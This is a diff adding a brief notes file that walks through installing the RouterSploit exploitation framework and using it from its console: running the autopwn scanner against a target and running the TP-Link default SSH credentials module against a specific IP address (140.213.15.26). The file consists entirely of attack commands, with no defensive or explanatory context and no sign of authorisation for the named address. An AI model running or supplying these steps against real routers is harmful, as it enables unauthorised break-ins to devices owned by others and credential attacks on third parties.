@@ -1,0 +1,38 @@
+git clone https://www.github.com/threat9/routersploit
+cd routersploit
+sudo python3 -m pip install -r requirements.txt
+python3 rsf.py
+
+
+rsf > search autopwn
+scanners/autopwn
+
+rsf > use scanners/autopwn
+
+rsf (AutoPwn) > show options
+
+rsf (AutoPwn) > set threads 20
+
+[+] threads => 20
+rsf (AutoPwn) > set target <ip address target>
+
+rsf (AutoPwn) > run
+
+back
+
+/////////////***************/////////////////
+
+rsf > search tplink
+
+rsf > use creds/routers/tplink/ssh_default_creds
+rsf (TP-Link Router Default SSH Creds) > show options
+
+rsf (TP-Link Router Default SSH Creds) > set threads 5
+[+] threads => 5
+
+rsf (TP-Link Router Default SSH Creds) > set target 140.213.15.26
+[+] target => 140.213.15.26
+
+rsf (TP-Link Router Default SSH Creds) > run
+
+
